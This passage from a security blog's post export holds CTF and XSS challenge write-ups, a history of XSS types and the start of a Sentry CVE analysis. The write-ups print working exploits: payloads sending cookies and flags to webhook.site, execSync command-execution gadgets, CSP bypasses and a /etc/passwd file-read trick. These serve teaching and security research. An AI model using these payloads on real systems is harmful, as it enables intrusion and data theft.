n0.alt+identifier&lt;location.hash+n20.alt?n28.src+++lo.src++: n0.alt+identifier&lt;location.hash+n21.alt?n29.src+++lo.src++: n0.alt+identifier&lt;location.hash+n22.alt?n30.src+++lo.src++: n0.alt+identifier&lt;location.hash+n23.alt?n31.src+++lo.src++: n0.alt+identifier&lt;location.hash+n24.alt?n32.src+++lo.src++: n0.alt+identifier&lt;location.hash+n25.alt?n33.src+++lo.src++: n0.alt+identifier&lt;location.hash+n26.alt?n34.src+++lo.src++: n35.src+++lo.src++>` &lt;!DOCTYPE html> &lt;html> &lt;head> &lt;meta charset=\"UTF-8\"> &lt;/head> &lt;body> &lt;/body> &lt;script> var payload = // see above payload = encodeURIComponent(payload) var baseUrl = 'https://my_server' // reset first fetch(baseUrl + '/reset').then(() => &#123; start() &#125;) async function start() &#123; // assume identifier start with 1 console.log('POC started') if (window.xssWindow) &#123; window.xssWindow.close() &#125; window.xssWindow = window.open(`https://challenge-0421.intigriti.io/?error=$&#123;payload&#125;#1`, '_blank') polling() &#125; function polling() &#123; fetch(baseUrl + '/polling').then(res => res.text()).then((token) => &#123; // guess fail, restart if (token === '1zz') &#123; fetch(baseUrl + '/reset').then(() => &#123; console.log('guess fail, restart') start() &#125;) return &#125; if (token.length >= 10) &#123; window.xssWindow.postMessage(&#123; type: 'waf', identifier: token, str: '&lt;img src=xxx onerror=alert(\"flag&#123;THIS_IS_THE_FLAG&#125;\")>', safe: true &#125;, '*') &#125; window.xssWindow.location = `https://challenge-0421.intigriti.io/?error=$&#123;payload&#125;#$&#123;token&#125;` // After POC finsihed, polling will timeout and got error message, I don't want to print the message if (token.length > 20) &#123; return &#125; console.log('token:', token) polling() &#125;) &#125; &lt;/script> &lt;/html> The server-side code is written very casually, is ugly, and has bugs: var express = require('express') const app = express() app.use(express.static('public')); app.use((req, res, next) => &#123; res.set('Access-Control-Allow-Origin', '*'); next() &#125;) const handlerDelay = 100 const loopDelay = 550 var initialData = &#123; count: 0, token: '1', canStartLoop: false, loopStarted: false, canSendBack: false &#125; var data = &#123;...initialData&#125; app.get('/reset', (req, res) => &#123; data = &#123;...initialData&#125; console.log('======reset=====') res.end('reset ok') &#125;) app.get('/polling', (req, res) => &#123; function handle(req, res) &#123; if (data.canSendBack) &#123; data.canSendBack = false res.status(200) res.end(data.token) console.log('send back token:', data.token) if (data.token.length &lt; 14) &#123; setTimeout(() => &#123; data.canStartLoop = true &#125;, loopDelay) &#125; &#125; else &#123; setTimeout(() => &#123; handle(req, res) &#125;, handlerDelay) &#125; &#125; handle(req, res) &#125;) app.get('/loop', (req, res) => &#123; function handle(req, res) &#123; if (data.canStartLoop) &#123; data.canStartLoop = false res.status(500) res.end() &#125; else &#123; setTimeout(() => &#123; handle(req, res) &#125;, handlerDelay) &#125; &#125; handle(req, res) &#125;) app.get('/:char', (req, res) => &#123; // already start stealing identifier if (req.params.char.length > 1) &#123; res.end() return &#125; console.log('char received', req.params.char) if (data.loopStarted) &#123; data.token += req.params.char console.log('token:', data.token) data.canSendBack = true res.status(500) res.end() return &#125; // first round data.count++ if (data.count === 36) &#123; console.log('initial image loaded, start loop') data.count = 0 data.loopStarted = true data.canStartLoop = true &#125; res.status(500) res.end() &#125;) app.listen(5555, () => &#123; console.log('5555') &#125;) ConclusionI learned a lot from this XSS challenge, such as: Using img src + onerror to create a loop (actually, it should be recursion). Using img src + srcset to repeatedly load images. Using location.hash to exchange information. Thinking about problems in a different way, using &gt; and &lt; instead of ==, and using comparison instead of equality. Using /a/.source or img.alt to replace strings, instead of constructing strings with single or double backticks. Although it took a lot of time, the sense of accomplishment when I solved it was great, and because it was a difficult problem, the sense of accomplishment was even greater. This article mainly describes my own solution, which is a bit cumbersome (because it requires server-side code), but it is the only solution I can think of. If nothing unexpected happens, the next article will introduce the official solution, which uses an element that I don’t know how to use and completely ignored: &lt;object&gt;.","link":"/2021/05/25/en/xss-challenge-by-intigriti-writeup/"},{"title":"XSS from scratch: history and origin","text":"I have written some articles about XSS before, mainly discussing the implementation of prevention and defense details: Preventing XSS may be harder than you think A brief discussion on the various aspects of XSS attacks and defense Originally, I wanted to write about the basics of XSS, the three types that everyone has heard of: Stored (Persistent), Reflected (Non-Persistent), and DOM-based XSS. However, when I was about to start writing, I suddenly had a few questions in my mind: “When did XSS appear? When were these three types classified?” Therefore, I spent some time looking for information, and this article will talk about the history of XSS with you, so that we can better understand the past and present of XSS. The Birth of XSSFrom the title of the article published on Microsoft’s MSDN blog in December 2009: Happy 10th birthday Cross-Site Scripting!, we can see that the term XSS (Cross-Site Scripting) was born around December 1999, which is more than 20 years ago now. (The screenshot below is from the above link) The original article ends with this paragraph: Let’s hope that ten years from now we’ll be celebrating the death, not the birth, of Cross-Site Scripting! Unfortunately, ten years after 2009, which is 2019, XSS is still active. In 2017, it ranked seventh in the OWASP top 10, and in the 2021 version, it was merged into the third-ranked Injection category. The article also mentions CERT® Advisory CA-2000-02 Malicious HTML Tags Embedded in Client Web Requests, which allows us to take a glimpse of the earliest appearance of XSS. Let’s take a brief look at the content of this webpage: A web site may inadvertently include malicious HTML tags or script in a dynamically generated page based on unvalidated input from untrustworthy sources. This can be a problem when a web server does not adequately ensure that generated pages are properly encoded to prevent unintended execution of scripts, and when input is not validated to prevent malicious HTML from being presented to the user. In the Overview section, the core concept of XSS is actually explained very clearly: the server does not verify the input or encoding, allowing attackers to insert some malicious HTML tags or scripts. Malicious code provided by one client for another client Sites that host discussion groups with web interfaces have long guarded against a vulnerability where one client embeds malicious HTML tags in a message intended for another client. For example, an attacker might post a message like Hello message board. This is a message.&lt;SCRIPT&gt;malicious code&lt;/SCRIPT&gt;This is the end of my message. When a victim with scripts enabled in their browser reads this message, the malicious code may be executed unexpectedly. Scripting tags that can be embedded in this way include &lt;SCRIPT&gt; &lt;OBJECT&gt;, &lt;APPLET&gt;, and &lt;EMBED&gt;. When client-to-client communications are mediated by a server, site developers explicitly recognize that data input is untrustworthy when it is presented to other users. Most discussion group servers either will not accept such input or will encode&#x2F;filter it before sending anything to other readers. This paragraph is later referred to as “Stored XSS (also known as Persistent XSS)”. Suppose there is a discussion forum where people can leave messages, and a malicious attacker can leave such content: Hello message board. This is a message. &lt;SCRIPT>malicious code&lt;/SCRIPT> This is the end of my message. When other users see this message, because there is &lt;script&gt; in the message, they will execute the JavaScript code left by the attacker. In addition to this, &lt;object&gt;, &lt;applet&gt;, and &lt;embed&gt; can also be used to execute JavaScript (by the way, the applet tag should be useless, see: Don’t break the Web: SmooshGate and keygen). Malicious code sent inadvertently by a client for itself Many Internet web sites overlook the possibility that a client may send malicious data intended to be used only by itself. This is an easy mistake to make. After all, why would a user enter malicious code that only the user will see? However, this situation may occur when the client relies on an untrustworthy source of information when submitting a request. For example, an attacker may construct a malicious link such as &lt;A HREF=&quot;http://example.com/comment.cgi? mycomment=&lt;SCRIPT&gt;malicious code&lt;/SCRIPT&gt;&quot;&gt; Click here&lt;/A&gt; When an unsuspecting user clicks on this link, the URL sent to example.co includes the malicious code. If the web server sends a page back to the user including the value of mycomment, the malicious code may be executed unexpectedly on the client. This example also applies to untrusted links followed in email or newsgroup messages. This paragraph is very interesting. The title is “Malicious code sent inadvertently by a client for itself”, and the content sent is basically only visible to oneself. For example, the parameter “mycomment” in the URL will be reflected on the screen, so if it is like http://example.com/comment.cgi?mycomment=123, 123 will appear on the screen. But what can you do if only you can see it? Because information is passed through the query string in the URL, such a link can be generated: http://example.com/comment.cgi?mycomment=&lt;SCRIPT&gt;malicious code&lt;/SCRIPT&gt;, and then this link is passed to others. When others click on it, &lt;SCRIPT&gt;malicious code&lt;/SCRIPT&gt; will appear on the screen, achieving XSS in the same way. This is another classification of XSS: Reflected XSS, and your input will be reflected on the screen. The difference between these two types is that Stored XSS, as its name suggests, the XSS payload is saved. In the case of a discussion forum, the article is saved in the database, while Reflected XSS is not. Taking PHP as an example, the code for Reflected XSS may look like this: &lt;?php $comment = $_GET['comment']; ?> &lt;div> &lt;?= $comment ?> &lt;/div> The GET parameter is directly reflected on the screen, so each time the payload must be passed in through the “comment” parameter, otherwise XSS will not be triggered. Taking the “discussion forum” website mentioned above as an example, the destructive power of Stored XSS should be stronger, because as long as you click on your article, you will be attacked. You can think of it as posting an article on PTT. As long as a netizen clicks into the article, they will be attacked, which is quite easy to trigger. But Reflected XSS is different. It requires the user to click on a link to trigger the attack, such as leaving a link in a PTT post and the user actively clicking on that link to trigger the XSS. Other parts of the article are also interesting, such as the fact that even if JavaScript is disabled, the screen can still be tampered with using HTML and CSS. There are also ways to fix it, which can be found here: Understanding Malicious Content Mitigation for Web Developers In addition to the familiar content encoding, there is another way to “specify the encoding method”. This encoding refers to UTF-8, ISO-8859-1, and big5 encoding. Although most websites nowadays use UTF-8, it was not always the case in the past. In the past, browsers also supported encoding methods such as UTF-7, which could achieve XSS even without using special characters: &lt;html> &lt;head>&lt;title>test page&lt;/title>&lt;/head> &lt;body> +ADw-script+AD4-alert(1)+ADw-/script+AD4- &lt;/body> &lt;/html> Example taken from: XSS and Character Set, which mentions more similar issues, but most of them occurred on earlier browsers. The Birth of the Third Type of XSS ClassificationAnyone who has read about XSS knows that there are probably three most well-known types of XSS classification: Stored XSS (Persistent XSS) Reflected XSS (Non-Persistent XSS) DOM-based XSS Before we continue, let me ask you two questions. The first question is, suppose I post an article with the content &lt;img src=x onerror=alert(1)&gt;, and the page code that displays the article is like this: &lt;script> getPost(&#123; id: 1&#125;).then(post => &#123; document.querySelector('.article').innerHTML = post.content &#125;) &lt;/script> Due to the use of innerHTML, there is an XSS vulnerability in this situation. My comment is indeed “saved” in the database, but at the same time, the content is changed using DOM. Should this XSS be classified as Stored XSS or DOM-based XSS? The second question is, suppose there is a piece of code in the webpage that looks like this: &lt;script> document.querySelector(\".search\").innerHTML = decodeURIComponent(location.search) &lt;/script> This can obviously create an XSS vulnerability through the query string. This XSS does reflect the user’s input and is not stored in the database, but it changes the content using DOM. Should it be classified as Reflected XSS or DOM-based XSS? Before reading on, think about these two questions. Let’s talk about my previous answer first. I used the following definition to classify these: If my XSS payload (such as &lt;script&gt;alert(1)&lt;/script&gt;) exists in the database, it is Stored XSS. If not, then it depends on whether my payload is output directly from the backend or assigned through DOM. The former is Reflected, and the latter is DOM-based. Later, I realized that this classification method was wrong because I was misled by the term “stored” and did not realize the historical background behind it. What does this mean? When XSS first appeared in 1999, Ajax did not exist (it was born in 2005), so data exchange between the front and back ends should be sent to the server through forms and rendered directly. In other words, in 1999, there were basically no operations that used JavaScript to change the content of the screen, even if there were, they were some relatively insignificant operations. But in 2021, it is different. In this era of SPA, data is basically called through JavaScript to call the API, and then the screen is changed after the data is obtained. The backend only provides data, and the frontend relies on JavaScript to render. This is completely different from 20 years ago. Of the three types of XSS classification, the first two, Stored and Reflected, existed when XSS was born, and the third type appeared five years later (the term or classification to define it, not the attack), and the source should be this article: DOM Based Cross Site Scripting or XSS of the Third Kind. The following paragraph is from the “Introduction” section of the article: XSS is typically categorized into “non-persistent” and “persistent” (“reflected” and “stored” accordingly, as defined in [4]). “Non-persistent” means that the malicious (Javascript) payload is echoed by the server in an immediate response to an HTTP request from the victim. “Persistent” means that the payload is stored by the system, and may later be embedded by the vulnerable system in an HTML page provided to a victim. The key point is that both the “Stored” and “Reflected” categories require the payload to be directly rendered by the backend. The third category mentioned in this article, DOM-based, refers to payloads rendered by the frontend. This is the biggest difference between the third category and the first two. When determining XSS, the first thing to confirm is whether the payload is rendered by the frontend or backend. If it is rendered by the frontend, regardless of where the data comes from (database, URL, or anywhere else), it is DOM-based XSS. If it is rendered by the backend, then it is either Stored or Reflected. Therefore, both of the previous questions are classified as DOM-based XSS because they are rendered by the frontend. The article provides a similar example: &lt;HTML> &lt;TITLE>Welcome!&lt;/TITLE> Hi &lt;SCRIPT> var pos=document.URL.indexOf(\"name=\")+5; document.write(document.URL.substring(pos,document.URL.length)); &lt;/SCRIPT> &lt;BR> Welcome to our system … &lt;/HTML> The comment in the article specifically states: The malicious payload was not embedded in the raw HTML page at any time (unlike the other flavors of XSS). Because the payload does not actually exist in any HTML page (it is changed later using JavaScript), it does not belong to Stored or Reflected, but is a new type of XSS. As for the repair method, since it is rendered by JavaScript on the frontend, encoding is the responsibility of the frontend developer. A common method is as follows (code taken from Sanitizing user input before adding it to the DOM in Javascript): function sanitize(string) &#123; const map = &#123; '&amp;': '&amp;amp;', '&lt;': '&amp;lt;', '>': '&amp;gt;', '\"': '&amp;quot;', \"'\": '&amp;#x27;', \"/\": '&amp;#x2F;', &#125;; const reg = /[&amp;&lt;>\"'/]/ig; return string.replace(reg, (match)=>(map[match])); &#125; However, it is important to note that this is not enough to prevent XSS. The defense against XSS is more complicated because it requires handling different situations. For example, if your output needs to be placed inside &lt;a href=&quot;&quot;&gt;, you need to consider payloads in the form of javascript:alert(1). In this case, the sanitize function above is not useful. ConclusionThe reason for the initial confusion was because the vulnerability classification reported on the HITCON ZeroDay platform was changed, which made me realize that I had misunderstood the classification. I would like to thank the reviewers for their work. In addition to these classifications, there are other ways to classify XSS, such as Self XSS, where users need to enter their own XSS payloads, or Mutation XSS, which exploits inconsistent HTML parsing. These are all interesting applications of XSS, and I will share more with you in the future.","link":"/2021/10/11/en/xss-history/"},{"title":"HITCON CTF 2023 and SECCON CTF 2023 Writeup","text":"Both of these competitions had many interesting but challenging problems. I really learned a lot. Keyword list: nim json, null byte nim request smuggling js-yaml web worker blob URL meta redirect file protocol &amp; .localhost domain sxg: Signed Exchanges 431 CSP bypass DOM clobbering document.body ejs delimiter Node.js + Deno prototype pollution gadget XSleaks golang sort HITCON CTF 2023Recently, it seems rare to see web challenges with less than 10 solves for each problem. The last time I saw such a competition was probably DiceCTF. However, I think the difficulty is secondary. The main point is to have fun, find it interesting, and learn new things. These problems, in my opinion, clearly achieved that. First, here are the write-ups from two authors. https://blog.splitline.tw/hitcon-ctf-2023-challenges-zh_tw&#x2F; https://github.com/maple3142/My-CTF-Challenges/#hitcon-ctf-2023 Both authors wrote detailed write-ups. Here, I will just record some key points after reading them. Login System (7 solves)This challenge has two servers: one in Node.js and the other in Nim. Basically, most of the functionality is implemented in the Nim server. You can log in, register, and change passwords. User data is stored in a YAML file, and the goal is to achieve RCE (Remote Code Execution). The first vulnerability is request smuggling. Node.js accepts Transfer-Encoding: CHUNKED, but Nim only looks at the chunk. This difference can be exploited for smuggling purposes. But what can be done after smuggling? The second vulnerability is related to Nim’s behavior with JSON. By setting a field to a very large number, Nim treats it as a RawNumber. When updating, it won’t include quotes. This can be used for JSON injection. The third vulnerability is that, with JSON injection, you can use the functionality of js-yaml to create an object with a JS function. Finally, by calling toString on this object during rendering, RCE can be achieved. It would look something like this: privilegeLevel: &#123; toString: !&lt;tag:yaml.org,2002:js/function> \"function ()&#123;console.log('hi')&#125;\" &#125; access: &#123;'profile': true, register: true, login: true&#125; Oh, by the way, there is another vulnerability related to Nim’s file reading. The filename can be truncated using a null byte: test.yaml\\u0000 Canvas (4 solves)This challenge is very interesting! In simple terms, it throws your code into a worker to execute it. Inside the worker, there are some protective measures that prevent you from accessing globalThis. Even if you manage to get XSS within the worker, the only thing you can do is post a message to the main thread. However, the result goes through setHTML and is filtered by the browser’s Sanitizer API. The worker’s sandbox is quite interesting. It looks something like this: function allKeys(obj) &#123; let keys = [] while (obj !== null) &#123; keys = keys.concat(Object.getOwnPropertyNames(obj)) keys = keys.concat(Object.keys(Object.getOwnPropertyDescriptors(obj))) obj = Object.getPrototypeOf(obj) &#125; return [...new Set(keys)] &#125; function hardening() &#123; const fnCons = [function () &#123;&#125;, async function () &#123;&#125;, function* () &#123;&#125;, async function* () &#123;&#125;].map( f => f.constructor ) for (const c of fnCons) &#123; Object.defineProperty(c.prototype, 'constructor', &#123; get: function () &#123; throw new Error('Nope') &#125;, set: function () &#123; throw new Error('Nope') &#125;, configurable: false &#125;) &#125; const cons = [Object, Array, Number, String, Boolean, Date, RegExp, Promise, Symbol, BigInt].concat(fnCons) for (const c of cons) &#123; Object.freeze(c) Object.freeze(c.prototype) &#125; &#125; const code = `console.log(1)` const argNames = allKeys(globalThis) const fn = Function(...argNames, code) const callUserFn = t => &#123; try &#123; fn.apply(Object.create(null)) &#125; catch (e) &#123; console.error('User function error', e) &#125; return true &#125; // hardening hardening() callUserFn() argNames collects the names of everything that global can access. This way, all the names can be treated as function parameters. It feels something like this: function run(console, Object, String, Number, fetch,...) &#123; &#125; So, no matter what you get, it will be undefined. When calling, this is also passed as Object.create(null), so it’s not easy to escape. Maple’s expected solution involves using try-catch and throwing an error to retrieve the value: try &#123; null.f() &#125; catch (e) &#123; TypeError = e.constructor &#125; Error = TypeError.prototype.__proto__.constructor Error.prepareStackTrace = (err, structuredStackTrace) => structuredStackTrace try&#123; null.f() &#125; catch(e) &#123; const g = e.stack[2].getFunction().arguments[0].target if (g) &#123; throw &#123; message: g &#125; &#125; &#125; He used a similar technique before in the DiceCTF 2022 - undefined challenge. However, there is an easier solution for this challenge, utilizing the default behavior of this, as shown below: function a() &#123; this.console.log('hello') &#125; a() In JavaScript, when calling a function, the default this will be the global object. By using this, you can bypass restrictions. But what can you do after bypassing the restrictions? It seems that you can’t do much in the worker because the main thread’s setHTML filters the content, and the CSP of this challenge is default-src &#39;self&#39; &#39;unsafe-eval&#39;. The key lies in the blob URL. You can create a new HTML using blob and load it. The origin of this new HTML is the same as the original one: const u = this.URL.createObjectURL(new this.Blob(['&lt;h1>peko&lt;/h1>'], &#123; type: 'text/html' &#125;)) location = u What surprised me about this challenge is that the &lt;meta&gt; redirect can also be redirected to a blob URL. So, by combining meta redirect, you can make the top-level page your own HTML and bypass the sanitizer’s restrictions. However, at this point, the CSP is inherited, so you still need to bypass the CSP. Here, you can use worker.js again, load it as a regular script, and execute XSS under the main thread. This challenge is really interesting, and the use of blob is quite clever. AMF (4 solves)I’m a bit lazy to study Python stuff, so I’ll leave it for now. The author has written a writeup. Harmony (2 solves)This challenge involves various Electron black magic. In Chromium, domains ending with .localhost are ignored when using the file protocol, for example: &#x2F;&#x2F; fail file:&#x2F;&#x2F;www.youtube.com.attacker.com&#x2F;etc&#x2F;passwd &#x2F;&#x2F; success file:&#x2F;&#x2F;www.youtube.com.localhost&#x2F;etc&#x2F;passwd (I feel like I accidentally came across this code before) And file:// is filtered out by DOMPurify, but since the webpage itself is a file, you can change it to use // to bypass the check. Next, file:// is same-origin in Electron, so after loading your own file, you can access top.api. Finally, by combining some prototype pollution techniques, you can achieve RCE (I didn’t study the second half in detail, you can refer to the author’s writeup). Sharer’s World (1 solve)The key to this challenge is something called SXG: https://web.dev/signed-exchanges/ I had never heard of this before this competition, and it turns out that the reference material on web.dev was available as early as 2021. It seems like I’ve been lagging behind for too long. Simply put, SXG allows you to sign a webpage with a certificate. When other websites send this signed resource, the browser treats it as if it is from the certified website. For example, suppose someone from example.com signs a webpage with their private key, creating an example.sxg file. Then I get this file and put it on my server with the URL: https://huli.tw/example.sxg When a user visits https://huli.tw/example.sxg, the content will be the previous website, and the URL will become example.com, as if this webpage came directly from example.com. SECCON CTF 2023As a JavaScript enthusiast, I really liked the challenges in this SECCON CTF. They were full of JavaScript. Although I couldn’t solve some of the challenges, I still learned a lot. Bad JWT (107 solves)The goal of this challenge is to generate a JWT with isAdmin: true. The key lies in the logic of JWT verification: const algorithms = &#123; hs256: (data, secret) => base64UrlEncode(crypto.createHmac('sha256', secret).update(data).digest()), hs512: (data, secret) => base64UrlEncode(crypto.createHmac('sha512', secret).update(data).digest()), &#125; const createSignature = (header, payload, secret) => &#123; const data = `$&#123;stringifyPart(header)&#125;.$&#123;stringifyPart(payload)&#125;`; const signature = algorithms[header.alg.toLowerCase()](data, secret); return signature; &#125; If header.alg is constructor, it becomes const signature = Object(data,secret), and the resulting signature becomes a string object that only contains data, ignoring the secret: console.log(Object(\"data\", \"secret\")) // String &#123;'data'&#125; Therefore, you just need to construct a signature that is the same. For a more detailed writeup, you can refer to: https://github.com/xryuseix/CTF_Writeups/tree/master/SECCON2023 SimpleCalc (23 solves)This question allows you to execute arbitrary JavaScript, but you need to use fetch with the X-FLAG header to get the flag. However, it will be blocked by CSP: app.use((req, res, next) => &#123; const js_url = new URL(`http://$&#123;req.hostname&#125;:$&#123;PORT&#125;/js/index.js`); res.header('Content-Security-Policy', `default-src $&#123;js_url&#125; 'unsafe-eval';`); next(); &#125;); By creating a response with a header that is too large and embedding it in an iframe, you can obtain a same-origin page without CSP, bypassing CSP: var f=document.createElement('iframe'); f.src = `http://localhost:3000/js/index.js?q=$&#123;'a'.repeat(20000)&#125;`; document.body.appendChild(f); f.onload = () => &#123; f.contentWindow.fetch('/flag', &#123; headers: &#123;'X-FLAG': 'a'&#125;, credentials:'include' &#125;) .then(res => res.text()) .then(flag => location='https://webhook.site/2ba35f39-faf4-4ef2-86dd-d85af29e4512?q='+flag) &#125; Interestingly, using window.open does not work. It is said that window.open will redirect the error page to a place like chrome://error, so the origin becomes null. The expected solution for this question is actually a service worker. It can be used under http + localhost to remove the CSP header by relying on the service worker. Below is @DimasMaulana’s exploit: from urllib.parse import quote target = \"http://localhost:3000\" webhook = \"https://webhook.site/9a2fbf03-9a64-49d1-9418-3728945d5e10\" rmcsp = \"\"\" self.addEventListener(\"fetch\", (ev) => &#123; console.log(ev) let headers = new Headers() headers.set(\"Content-Type\",\"text/html\") if (/\\/js\\//.test(ev.request.url))&#123; ev.respondWith(new Response(\"&lt;script>fetch('/flag',&#123;headers:&#123;'X-FLAG':'1'&#125;,credentials:'include'&#125;).then(async r=>&#123;location='\"\"\"+webhook+\"\"\"?'+await r.text()&#125;)&lt;/script>\",&#123;headers&#125;)) &#125; &#125;); console.log(\"registered2\") document = &#123;&#125; document.getElementById = ()=>&#123;return &#123;innerText:\"testing\"&#125;&#125; \"\"\" workerUrl = \"/js/index.js?expr=\"+quote(rmcsp) payload = \"navigator.serviceWorker.register('\"+workerUrl+\"');setInterval(()=>&#123;location='/js/test'&#125;,2000)\" print(payload) payload = target+\"/js/..%2f?expr=\"+quote(payload) blink (14 solves)The core code for this question is as follows: const createBlink = async (html) => &#123; const sandbox = wrap( $(\"#viewer\").appendChild(document.createElement(\"iframe\")) ); // I believe it is impossible to escape this iframe sandbox... sandbox.sandbox = sandboxAttribute; sandbox.width = \"100%\"; sandbox.srcdoc = html; await new Promise((resolve) => (sandbox.onload = resolve)); const target = wrap(sandbox.contentDocument.body); target.popover = \"manual\"; const id = setInterval(target.togglePopover, 400); return () => &#123; clearInterval(id); sandbox.remove(); &#125;; &#125;; It is not possible to bypass the sandbox in the iframe, but the key is the line of code setInterval(target.togglePopover, 400). If target.togglePopover is a string, it can be used as an eval. And target is sandbox.contentDocument.body, which can be used to DOM clobber document.body with name, and then clobber togglePopover to complete the task. &lt;iframe name=body srcdoc=\"&lt;a id=togglePopover href=a:fetch(`http://webhook.site/2ba35f39-faf4-4ef2-86dd-d85af29e4512?q=$&#123;document.cookie&#125;`)>&lt;/a>\">&lt;/iframe> eeeeejs (12 solves)Unfortunately, I couldn’t solve this question even after trying for a long time QQ The core code for this question is as follows: const ejs = require(\"ejs\"); const &#123; filename, ...query &#125; = JSON.parse(process.argv[2].trim()); ejs.renderFile(filename, query).then(console.log); You can control filename and query, and the goal is XSS. The CSP is set to self, which means that as long as you create &lt;script src=/&gt; and construct a valid JS code, you can get the flag. But another limitation here is that you can only read files under src, so your template is limited. The solution is to use EJS options openDelimiter, closeDelimiter, and delimiter to let EJS parse the template in different ways. Because in EJS, &lt;%= can output the content followed by it, and &lt;%- can output unescaped content. So my initial idea was to find a string that matches this pattern, but I only found half of it in the end. I could create &lt;script&gt;, but the attribute content would be encoded. I also found a valid way to generate JavaScript. In short, I couldn’t solve it in the end. After the competition, when I looked at other people’s solutions, I realized that I forgot that this question calls node.js to output. The author’s solution is to set debug to true, which allows EJS to output src, and src will include the filename. Then you can use the property of the filename object to pass in any content. Alternatively, you can directly put console.log(src) into the template. For example, there is a piece of text as follows: if (opts.debug) &#123; console.log(src); &#125; if (opts.compileDebug &amp;&amp; opts.filename) &#123; src = src + \"\\n//# sourceURL=\" + sanitizedFilename + \"\\n\"; &#125; // other codes After doing this: ejs.renderFile('test', &#123; 'src': &#123; helllo: 'world' &#125;, settings: &#123; 'view options': &#123; delimiter: ' ', openDelimiter: 'if (opts.debug)', closeDelimiter: \" if (opts.compileDebug &amp;&amp; opts.filename)\" &#125; &#125; &#125;).then(r => console.log(r)); The output will be: &#123; helllo: &#39;world&#39; &#125; &#123; src &#x3D; src + &quot;\\n&#x2F;&#x2F;# sourceURL&#x3D;&quot; + sanitizedFilename + &quot;\\n&quot;; &#125; &#x2F;&#x2F; other codes The reason for this is that after changing the delimiter, the above text is equivalent to: &lt;% &#123; console.log(src); &#125; %> &#123; src = src + \"\\n//# sourceURL=\" + sanitizedFilename + \"\\n\"; &#125; // other codes Therefore, it is equivalent to executing console.log(src), so src will appear in the output. node-ppjail (5 solves)This question allows you to pollute things on the prototype, and the value can be a function, but the problem is that you cannot pollute existing properties. The solution is to trigger an error and then find out what the Node.js will do, and then pollute the corresponding properties. A simple example is: Object.prototype.prepareStackTrace = function()&#123; console.log('pwn') &#125; Object.toString.arguments The output is: pwn &#x2F;js&#x2F;pp.js:4 Object.toString.arguments ^ [TypeError: &#39;caller&#39;, &#39;callee&#39;, and &#39;arguments&#39; properties may not be accessed on strict mode functions or the arguments objects for calls to them] Node.js v20.0.0 As for how to find this attribute, it seems like a good choice to patch V8 by learning from maple. The author has found two other methods, which are recorded here for future reference. The source is the author’s writeup: def solve1() -> str: # Solution 1: return json.dumps(&#123; \"__proto__\": &#123; # ref. https://github.com/nodejs/node/blob/v20.6.0/lib/internal/fixed_queue.js#L81 # ref. https://github.com/nodejs/node/blob/v20.6.0/lib/internal/process/task_queues.js#L77 \"1\": &#123; \"callback\": &#123; \"__custom__\": True, \"type\": \"Function\", \"args\": [ f\"console.log(global.process.mainModule.require('child_process').execSync('&#123;command&#125;').toString())\" ], &#125;, &#125;, &#125;, &#125;) def solve2() -> str: # Solution 2: return json.dumps(&#123; \"__proto__\": &#123; # ref. https://github.com/nodejs/node/blob/v20.6.0/lib/internal/util/inspect.js#L1064 \"circular\": &#123; \"get\": &#123; \"__custom__\": True, \"type\": \"Function\", \"args\": [ f\"console.log(global.process.mainModule.require('child_process').execSync('&#123;command&#125;').toString())\" ], &#125;, &#125;, # ref. https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Error/cause \"cause\": 1, &#125;, # Cause an error \"toString\": &#123; \"caller\": &#123;&#125;, &#125;, &#125;) deno-ppjail (2 solves)Similar to the previous question, but this time we need to find a gadget for deno. The gadget that the author found is Object.prototype.return. Maple found cause + circular.get, and @parrot409 found nodeProcessUnhandledRejectionCallback. For more detailed explanations, you can refer to maple’s writeup: https://blog.maple3142.net/2023/09/17/seccon-ctf-2023-quals-writeups/#deno-ppjail hidden-note (1 solve)This challenge is also interesting. It belongs to the type of XS leaks. There is a search function, but the search results filter out the flag. The search result page can leak information through meta redirect, so we can see the result page. However, the flag has been removed from the result page. What else can we do? During the search, the results are sorted first, and then the flag is removed. The sorting method used in this question is a stable sort when the number of elements is &lt;&#x3D; 12, and an unstable sort when the number of elements is &gt; 12. Therefore, we can create exactly 12 notes with the content: ECCON&#123;@|ECCON&#123;a|ECCON&#123;b|... Suppose the flag is SECCON&#123;abc&#125;. When searching for ECCON&#123;@, because the total number is 12, it is a stable sort, and the order of the IDs on the search result page will not change. But if we search for ECCON&#123;a, the result becomes 13, and it becomes an unstable sort, changing the order of the notes. Therefore, by examining the content of the result page, we can determine whether the original search result was within 12 or more than 12, and use it as an oracle to leak the flag. This solution is really cool and innovative! Both Ark, who created the challnenge, and maple, who solved it, are really amazing.","link":"/2023/09/23/en/hitcon-seccon-ctf-2023-writeup/"},{"title":"Analysis of CVE-2023-46729: URL Rewrite Vulnerability in Sentry Next.js SDK","text":"On November 9, 2023, Sentry published an article on their blog titled Next.js SDK Security Advisory - CVE-2023-46729. The article discusses the details of the CVE-2023-46729 vulnerability, including its cause, discovery time, and patching time. Although the vulnerability was officially announced on 11&#x2F;9, it was actually fixed in version 7.77.0 released on 10&#x2F;31. Some time was given to developers to patch the vulnerability. Now let’s briefly discuss the cause and attack method of this vulnerability. Vulnerability AnalysisThere is also a more technical explanation on GitHub: CVE-2023-46729: SSRF via Next.js SDK tunnel endpoint You can see this paragraph: An unsanitized input of Next.js SDK tunnel endpoint allows sending HTTP requests to arbitrary URLs and reflecting the response back to the user. In Sentry, there is a feature called “tunnel,” and this image from the official documentation perfectly explains why tunneling is needed: Without tunneling, requests sent to Sentry would be directly sent through the browser on the frontend. However, these requests sent directly to Sentry may be blocked by ad blockers, preventing Sentry from receiving the data. If tunneling is enabled, the request is first sent to the user’s own server and then forwarded to Sentry. This way, the request becomes a same-origin request and will not be blocked by ad blockers. In the Sentry SDK specifically designed for Next.js, a feature called rewrite is used. Here is an example from the official documentation: module.exports = &#123; async rewrites() &#123; return [ &#123; source: '/blog', destination: 'https://example.com/blog', &#125;, &#123; source: '/blog/:slug', destination: 'https://example.com/blog/:slug', // Matched parameters can be used in the destination &#125;, ] &#125;, &#125; Next.js rewrite can be divided into two types: internal and external. The latter is more like a proxy, as it can directly redirect the request to an external website and display the response. The implementation of the Next.js Sentry SDK is in sentry-javascript&#x2F;packages&#x2F;nextjs&#x2F;src&#x2F;config&#x2F;withSentryConfig.ts: /** * Injects rewrite rules into the Next.js config provided by the user to tunnel * requests from the `tunnelPath` to Sentry. * * See https://nextjs.org/docs/api-reference/next.config.js/rewrites. */ function setUpTunnelRewriteRules(userNextConfig: NextConfigObject, tunnelPath: string): void &#123; const originalRewrites = userNextConfig.rewrites; // This function 